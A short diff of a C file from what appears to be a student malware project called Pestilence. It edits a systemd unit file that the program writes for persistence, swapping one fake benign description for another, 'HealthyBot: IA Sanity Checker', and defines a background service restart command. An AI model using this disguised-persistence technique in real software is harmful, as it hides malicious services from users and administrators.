@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/19 11:01:52 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/26 03:37:06 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/05/26 04:01:38 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -35,7 +35,7 @@ typedef struct s_service_ctx
 #define SERVICE_RESTART "systemctl restart Pestilence.service &"
 #define SERVICE_FILE_CONTENT "\
 [Unit]\n\
-Description=Fitness app to track eating habits (it's real bro dont be silly...)\n\
+Description=HealthyBot: IA Sanity Checker (it's real bro i swear...)\n\
 After=network.target\n\
 StartLimitIntervalSec=0\n\
 [Service]\n\
